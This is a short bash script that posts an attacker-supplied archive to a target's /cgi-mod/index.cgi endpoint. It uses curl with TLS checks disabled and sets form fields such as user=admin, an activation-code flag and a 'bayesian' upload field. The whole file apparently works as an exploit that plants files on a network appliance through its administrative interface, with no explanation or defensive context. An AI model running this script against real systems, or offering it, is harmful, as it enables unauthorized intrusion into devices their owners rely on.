#!/usr/bin/env bash
set -euo pipefail
TARGET_URL="${1:?target required}"
ARCHIVE_PATH="${2:?archive required}"

curl -ksS \
  -F "user=admin" \
  -F "UPDATE_activation_code=1" \
  -F "pu_bayesian_upload=1" \
  -F "bayesian=@${ARCHIVE_PATH};type=application/octet-stream" \
  "${TARGET_URL%/}/cgi-mod/index.cgi"
